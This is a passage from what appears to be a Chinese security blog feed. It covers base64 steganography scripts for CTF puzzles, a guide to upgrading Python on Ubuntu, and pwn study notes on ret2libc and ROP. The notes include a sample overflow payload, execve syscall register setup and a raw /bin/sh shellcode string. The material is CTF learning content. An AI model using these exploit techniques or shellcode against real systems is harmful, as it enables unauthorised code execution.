class="line">dmFsZW5=b&#x27;valen&#x27;</span><br><span class="line">dmFsZW6=b&#x27;valen&#x27;</span><br><span class="line">dmFsZW7=b&#x27;valen&#x27;</span><br></pre></td></tr></table></figure><p>可以看到多个密文能够对应同一个字符串，这是因为在解密的时候会删除后面几个跟等号数量有关的二进制位，所以会导致不同的密文也能对应同一个明文。</p><p>并且删除的二进制位指挥在最后一个字符，并且base最多只有两个等号，所以一共可以有2*2个隐写位可以写，而且并不会影响真实的加密信息。</p><p>利用这个想法于是就有了base64隐写</p><h5 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h5><p>读取出一行被加密后二进制信息，目前是base64加密的状态，保存为steg_line</p><p>然后将steg_line进行base64解密，然后再去进行加密，得到norm_line，这样是消除伪加密</p><p>然后根据steg_line和norm_line进行对比，返回两个字符串的绝对值</p><p>然后根据等号的个数pads_num和绝对值diff来对bin_str进行不同的操作</p><ul><li>绝对值为0，等号个数为2，此时需要加两个00在bin_str后面</li><li>绝对值为0，等号个数为1，此时需要加一个00在bin_str后面</li><li>绝对值不为0，需要将绝对值diff转成二进制，同时在前面补0需要补到2*等号个数pads_num的数量上</li></ul><p>然后将所有的bin_str进行二进制转成ASCII值得到真的密文</p><h5 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h5><p>base隐写解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#base64隐写</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def get_base64_diff_value(s1, s2):</span><br><span class="line">    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="line">    res = 0</span><br><span class="line">    for i in range(len(s2)):</span><br><span class="line">        if s1[i] != s2[i]:</span><br><span class="line">            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_stego():</span><br><span class="line">    with open(&#x27;1.txt&#x27;) as f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = &#x27;&#x27;</span><br><span class="line">        for line in file_lines:</span><br><span class="line">            steg_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">            # norm_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">            norm_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;).encode(&#x27;utf-8&#x27;)</span><br><span class="line">            norm_line = base64.b64decode(norm_line).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">            norm_line = base64.b64encode(norm_line.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            norm_line = norm_line.replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            print(diff)</span><br><span class="line">            pads_num = steg_line.count(&#x27;=&#x27;)</span><br><span class="line">            if diff:</span><br><span class="line">                bin_str += bin(diff)[2:].zfill(pads_num * 2)</span><br><span class="line">            else:</span><br><span class="line">                bin_str += &#x27;0&#x27; * pads_num * 2</span><br><span class="line">            print(goflag(bin_str))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def goflag(bin_str):</span><br><span class="line">    res_str = &#x27;&#x27;</span><br><span class="line">    for i in range(0, len(bin_str), 8):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + 8], 2))</span><br><span class="line">    return res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>实现过程</p><p>加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;valen&#125;&#x27;</span> <span class="comment">#flag</span></span><br><span class="line">bin_str = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])<span class="comment">#字符串转成二进制</span></span><br><span class="line">base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;0.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f0, <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f1: <span class="comment">#&#x27;0.txt&#x27;是明文, &#x27;1.txt&#x27;用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#然后加密</span></span><br><span class="line">        equalnum = rowstr.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> <span class="built_in">len</span>(bin_str):</span><br><span class="line">            offset = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[<span class="built_in">len</span>(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum*<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        f1.write(rowstr + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu更新python</title>
      <link href="/article/2022-01-14-Ubuntu%E6%9B%B4%E6%96%B0python/"/>
      <url>/article/2022-01-14-Ubuntu%E6%9B%B4%E6%96%B0python/</url>
      
        <content type="html"><![CDATA[<p>主要记录一下更新Ubuntu更新python的踩坑记录。</p><span id="more"></span><h2 id="版本确定"><a href="#版本确定" class="headerlink" title="版本确定"></a>版本确定</h2><p>Ubuntu 16.04 中安装为例，一开始的时候<code>python3 --version</code></p><p><img src="/image/media/2022/python/1.jpg"></p><p>可以看到是Python 3.5.2</p><h2 id="准备操作"><a href="#准备操作" class="headerlink" title="准备操作"></a>准备操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt可以看作apt－get和apt－cache命令的子集，可以为包管理提供必要的命令选项。</span><br><span class="line">apt－get虽然没被弃用，但作为普通用户，还是应该首先使用apt。</span><br></pre></td></tr></table></figure><p>Ubuntu系统自带的源都是国外的网址，国内用户在使用的时候网速比较慢。建议大家更换国内的源，这里使用阿里源，步骤如下：</p><ul><li>备份现在使用的源</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</span><br></pre></td></tr></table></figure><ul><li>更换源</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list</span><br><span class="line">把下面阿里云的信息复制进去</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse  </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse  </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse  </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse  </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse  </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse  </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse  </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse  </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse  </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse </span><br><span class="line">然后：wq保存</span><br></pre></td></tr></table></figure><ul><li>更新添加的源</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><ul><li>更新软件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><ul><li>安装依赖</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/python/2.jpg"></p><ul><li>添加 deadsnakes PPA 源</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line">运行到下面这个位置回车即可</span><br><span class="line">Press [ENTER] to continue or Ctrl-c to cancel adding it.</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/python/3.jpg"></p><p><img src="/image/media/2022/python/4.jpg"></p><h2 id="更新到-python-3-8"><a href="#更新到-python-3-8" class="headerlink" title="更新到 python 3.8"></a>更新到 python 3.8</h2><ul><li>安装python3.8</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3.8</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/python/5.jpg"></p><ul><li>定位python位置和设置优先级</li></ul><p>此时能看到有两个python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ which python3.8</span><br><span class="line">/usr/bin/python3.8</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 1</span><br><span class="line"> </span><br><span class="line">$ which python3.5</span><br><span class="line">/usr/bin/python3.5</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 2</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/python/6.jpg"></p><ul><li>设置默认python3指向python3.8</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config python3</span><br></pre></td></tr></table></figure><p>在后面输入python版本前面的数字，然后回车即可。</p><p><img src="/image/media/2022/python/7.jpg"></p><p>此时可以看到python版本以及变成了3.8</p><p><img src="/image/media/2022/python/8.jpg"></p><h2 id="开始踩坑"><a href="#开始踩坑" class="headerlink" title="开始踩坑"></a>开始踩坑</h2><h3 id="pip丢失"><a href="#pip丢失" class="headerlink" title="pip丢失"></a>pip丢失</h3><p>前面已经可以看到python版本显示3.8.9但是<code>pip3 --version</code>不显示没有命令</p><p><img src="/image/media/2022/python/9.jpg"></p><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>直接使用其他机器上的get-pip.py<a href="/image/media/2022/python/get-pip.py">下载链接</a></p><p><img src="/image/media/2022/python/16.jpg"></p><p>这样就能解决问题了</p><h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>通过<code>sudo apt-get install python3-pip</code>安装</p><p><img src="/image/media/2022/python/10.jpg"></p><p>可以看到这样安装会有错误，而且问题好像严重了</p><p><img src="/image/media/2022/python/11.jpg"></p><p>此时通过<code>sudo apt-get install python3.8-distutils</code>来解决上述问题，注意python3.8-distutils中的python版本问题</p><p><img src="/image/media/2022/python/12.jpg"></p><p>此时再看<code>pip3 --version</code>会发现问题变化了</p><p><img src="/image/media/2022/python/13.jpg"></p><p>然后去修改一下<code>sudo vi /usr/bin/pip3</code>内容</p><p>将原来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import main</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import __main__</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><p>此时能看到<code>pip3 --version</code>会有版本显示，但是这样pip list会报错</p><p><img src="/image/media/2022/python/14.jpg"></p><p><img src="/image/media/2022/python/15.jpg"></p><p>建议使用解法1</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
          <category> Linux </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> vim </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn技巧</title>
      <link href="/article/2022-01-05-pwn%E6%8A%80%E5%B7%A7/"/>
      <url>/article/2022-01-05-pwn%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>主要记录pwn学习过程中的一些东西。</p><span id="more"></span><h1 id="python-内置函数"><a href="#python-内置函数" class="headerlink" title="python 内置函数"></a>python 内置函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int([x[,base]]) 转换字符串或者数值为整。参数为字符串的时候，必须制定进制base，默认进制是10，可以取[2,36]或者0。为0的时候，进制信息从字符串中获取。Int的返回为10进制的整数。输入为浮点数时，会进行靠近0截断处理。类似的内置函数有float，long等。int(&#x27;0x1AA&#x27;,16)</span><br><span class="line">bin():把十进制整形转换成二进制字符</span><br><span class="line">hex():把10进制转整形换成16进制</span><br><span class="line">oct():把十进制转换成八进制字符</span><br><span class="line">chr():把一个整形转换成ASCII码表中对应的单个字符 ,该参数必须是在范围[0..255]。把一个整形转换成ASCII码表中对应的单个字符</span><br><span class="line">unichr(i)是chr的unicode版本，例如，unichr（97）返回字符串u&#x27;a&#x27;。参数的取值范围取决于Python如何配置 - 这可能是UCS2 [0..0xFFFF]或UCS4 [0..0x10FFFF]。</span><br><span class="line">ord():和chr相反，把ASCII码表中的字符转换成对应的整形</span><br></pre></td></tr></table></figure><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">大概思路，checksec查看架构和保护，然后看后门函数</span><br><span class="line">如果有system和/bin/sh:就想办法直接溢出或者其他方法直接去覆盖下来</span><br><span class="line">如果没有/bin/sh，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh </span><br><span class="line">如果没有system和/bin/sh，需要使用libc中的system和/bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的libc，从而知道其他函数的地址</span><br><span class="line"></span><br><span class="line">获得libc的某个函数的地址通常采用的方法是：通过got泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数地址，所以这类题目需要两次payload</span><br><span class="line">程序执行后，plt表里是got表的地址，got表是函数的真实地址</span><br></pre></td></tr></table></figure><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.通过第一次溢出，通过将puts的PLT地址放在返回处，泄露出执行过的函数的GOT地址（实际上puts的就可以），本地跟远程泄露的地址有可能不太一样</span><br><span class="line">2.将puts的返回地址设置为_start函数（main()函数是用户代码的入口，是对用户而言；而_start()函数是系统代码的入口，是程序正真的入口），方便再次用来执行system(&#x27;/bin/sh&#x27;)</span><br><span class="line">3.通过泄露的函数的GOT地址，计算出libc中system和/bin/sh的地址</span><br><span class="line">4.再次通过溢出将返回地址覆盖成泄露出来的system的地址getshell</span><br><span class="line"></span><br><span class="line">_system函数:在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。这四个字符可以任意。</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数</span><br><span class="line">应用程序调用系统调用的过程是：</span><br><span class="line">    1、把系统调用的编号存入 EAX</span><br><span class="line">    2、把函数参数存入其它通用寄存器</span><br><span class="line">    3、触发 0x80 号中断（int 0x80）</span><br><span class="line"></span><br><span class="line">那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了</span><br><span class="line">如果说想通过系统调用执行的是：execve(&quot;/bin/sh&quot;,NULL,NULL)（32位程序）</span><br><span class="line">查看 execve 的系统调用号：cat /usr/arm-linux-gnueabihf/include/asm/unistd.h | grep execve</span><br><span class="line">然后将得到的结果转换成16进制。</span><br><span class="line"></span><br><span class="line">eax寄存器存放系统调用号，ebx寄存器存放想要执行的/bin/sh的地址，还有两个参数设置为 0</span><br><span class="line">所以现在需要做的就是让：</span><br><span class="line">    eax=0xb#execve的系统调用号</span><br><span class="line">    ebx=/bin/sh 的地址  #要执行/bin/sh的地址</span><br><span class="line">    ecx=0#置为0</span><br><span class="line">    edx=0#置为0</span><br><span class="line">只需要让栈顶的值是0xb然后可以通过pop eax达到目的</span><br></pre></td></tr></table></figure><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PLT：存放额外代码的表，称为程序链接表（超链接本身）</span><br><span class="line">GOT：用来存放外部的函数地址的数据表，称为全局偏移表（超链接的内容）</span><br><span class="line">延时绑定只有在动态库函数在被调用时，才会地址解析和重定向</span><br><span class="line">一般ret2libc需要构造两次payload</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x9+0x4)+p32(puts_plt)+p32(main_add)+p32(puts_got)</span><br><span class="line"># 通过libc泄露某个函数地址的方法：通过got泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数地址</span><br><span class="line"></span><br><span class="line">程序执行后，plt表里是got表的地址，got表是函数的真实地址</span><br><span class="line">程序还未执行时，got表里还是plt表的地址，需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样</span><br><span class="line">针对于地址中间位进行随机，最低的12位并不会发生改变，也就是我们需要获取到远程环境的函数的真实地址</span><br><span class="line">进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell </span><br></pre></td></tr></table></figure><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><pre><code>EIP:存放房前执行的下一条指令的偏移地址，ESP:存放当前栈帧的栈顶偏移地址,存储函数调用栈的栈顶地址EBP:存放当前栈帧的栈底偏移地址,存储当前函数状态的基地址RAX:通用寄存器，存放返回值EIP寄存器始终指向下一条将要执行的指令，也就是说如果我们可以通过某种方式修改EIP寄存器的值，</code></pre><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little#程序架构信息</span><br><span class="line">RELRO:    Partial RELRO#GOT 改写</span><br><span class="line">Stack:    No canary found#canary栈溢出保护</span><br><span class="line">NX:       NX enabled#栈中数据没有执行权限</span><br><span class="line">PIE:      No PIE (0x8048000)#位置无关可执行文件，no PIE可以使用ROP</span><br></pre></td></tr></table></figure><h1 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h1><h2 id="计算栈空间大小"><a href="#计算栈空间大小" class="headerlink" title="计算栈空间大小"></a>计算栈空间大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法一：直接使用IDA静态调试某个空间，查看定义给的大小，然后32位程序加4，64位程序加8</span><br><span class="line">方法二：使用gdb将程序run起来之后，输入大量字符，函数会外带一个地址，转码之后就是空间大小</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/pwnstudy/1.jpg"></p><p>上图为32位程序的计算方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大量数据溢出之后，程序暂停后使用’x/x $rsp‘，查看RSP寄存器的地址信息和内容，将结果后面8位用于转换</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/pwnstudy/4.jpg"></p><p>上图为64位计算方式</p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><pre><code>下断点之后能看到    $eax   : 0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;    $ebx   : 0x00000000    $ecx   : 0xffffffff    $edx   : 0xf7faf870  →  0x00000000    $esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;    $ebp   : 0xffffcdc8  →  0x00000000    $esi   : 0xf7fae000  →  0x001b1db0    $edi   : 0xf7fae000  →  0x001b1db0    $eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;    在里面esp为0xffffcd40,      ebp为0xffffcdc8,         同时s相对于esp的索引为esp+0x1c(hex(0xffffcd5c-0xffffcd40)):得到结论s的地址为 0xffffcd5c：ESP中间的那个数s相对于 ebp 的偏移为 0x6c：ebp第一个数 减掉 esp中间的那个数(hex(0xffffcdc8-0xffffcd5c))s相对于返回地址的偏移为 0x6c+4：加4因为是32的程序，64位+8(hex(0xffffcdc8-(0xffffcd40+(0xffffcd5c-0xffffcd40))))esp为    0xffffced0ebp为    0xffffcf58s的地址为   0xffffcefes相对于ebp的偏移为s相对于返回地址的偏移为#jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80</code></pre><h2 id="确定libc版本"><a href="#确定libc版本" class="headerlink" title="确定libc版本"></a>确定libc版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">工具：LibcSearcher或者ldd,本地跟远程泄露的地址有可能不太一样</span><br><span class="line">ldd 文件名：查看libc地址</span><br><span class="line"></span><br><span class="line">方法一：在线寻找，gdb调试程序，run之后，ctrl+c中断程序，使用p(print)查看函数地址，再次run，对比system和read函数地址，通过低三位可以判断版本，并得到其他函数偏移。https://libc.blukat.me/</span><br><span class="line"></span><br><span class="line">方法二：使用LibcSearcher（需要提前安装）</span><br><span class="line">puts_real_addr= u32(sh.recv(4))#获取到put的执行后的地址</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_real_addr)#puts是函数名，puts_real_addr是函数地址，定位libc</span><br><span class="line">libcbase=puts_real_addr-libc.dump(&#x27;puts&#x27;)#基址=函数中的puts地址-libc中的puts地址</span><br><span class="line">systyem_addr=libcbase+libc.dump(&#x27;system&#x27;)#system偏移,基址+system在libc中的地址</span><br><span class="line">bin_sh_sddr=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)#/bin/sh偏移,基址+字符串/bin/sh在libc中的地址</span><br><span class="line"></span><br><span class="line">通过libc泄露某个函数地址的方法：通过got泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数地址</span><br></pre></td></tr></table></figure><h2 id="ROP（返回导向编程）"><a href="#ROP（返回导向编程）" class="headerlink" title="ROP（返回导向编程）"></a>ROP（返回导向编程）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</span><br><span class="line">所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</span><br><span class="line"></span><br><span class="line">之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。</span><br><span class="line">ROP 攻击一般得满足如下条件</span><br><span class="line">- 程序存在溢出，并且可以控制返回地址。</span><br><span class="line">- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</span><br><span class="line">如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</span><br></pre></td></tr></table></figure><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 